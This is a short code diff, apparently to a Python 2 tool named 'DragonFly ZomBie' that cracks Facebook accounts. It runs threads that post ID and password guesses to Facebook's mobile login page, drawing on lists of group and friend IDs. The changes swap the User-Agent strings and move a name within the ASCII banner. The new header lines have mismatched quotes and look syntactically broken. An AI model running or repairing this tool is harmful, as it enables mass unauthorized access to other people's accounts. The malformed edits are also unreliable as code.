@@ -37,7 +37,7 @@ br.set_handle_referer(True)
 br.set_cookiejar(cookielib.LWPCookieJar())
 br.set_handle_redirect(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36')]
+br.addheaders = [('User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36')]
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
@@ -260,7 +260,7 @@ class mt(threading.Thread):
         return self.a,self.id
     def run(self):
         try:
-             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36}))
+             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36}))
         except KeyboardInterrupt:
             os.sys.exit()
         except:
@@ -379,10 +379,10 @@ def menu():
                      .-.-..
                     /+/++//
                    /+/++//
-            \rk*   *\rh /+/++//
+            \rk*   *\rh /+/++//arya shule
              \ /  |/__//
            {\rmX\rh}v{\rmX\rh}|\rcPRX\rh|==========.
-             [']  /'|'\           \\arya shule
+             [']  /'|'\           \\
                  /  \  \           '
                  \_  \_ \_    \rk*\rhDragonFly ZomBie
 \rk###########################################################
